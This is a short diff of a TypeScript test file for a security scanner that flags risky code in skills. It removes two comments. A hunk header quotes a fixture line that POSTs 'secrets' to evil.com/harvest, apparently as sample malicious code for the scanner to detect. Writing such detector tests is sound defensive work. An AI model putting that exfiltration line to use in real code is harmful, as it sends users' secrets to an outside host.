@@ -1,4 +1,3 @@
-// Tests security skill scanner test behavior.
 import fsSync from "node:fs";
 import fs from "node:fs/promises";
 import os from "node:os";
@@ -258,7 +257,6 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
 
   it("does not flag child_process import without exec/spawn call", () => {
     const source = `
-// This module wraps child_process for safety
 import type { ExecOptions } from "child_process";
 const options: ExecOptions = { timeout: 5000 };
 `;
